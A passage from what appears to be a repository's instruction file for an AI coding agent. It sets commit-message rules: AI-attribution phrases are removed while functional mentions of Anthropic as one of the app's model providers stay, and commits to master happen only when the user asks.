  every commit message for `claude|anthropic|co-authored|generated with` before committing.**
- **The ban is on ATTRIBUTION, not the PRODUCT.** Anthropic is one of the app's four providers, so functional
  mentions stay: the `Anthropic (Claude)` label, `api.anthropic.com`, `claude-*` model ids, family parsing in
  `modelVersions.js`, and the `.claude/skills/run-ebiki` path used by `package.json`'s `drive` script. Test: does the
  text describe a provider the app talks to (keep) or who wrote the commit (remove)?
- Don't commit to `master` unless asked; the user asks for pushes to `master` explicitly.
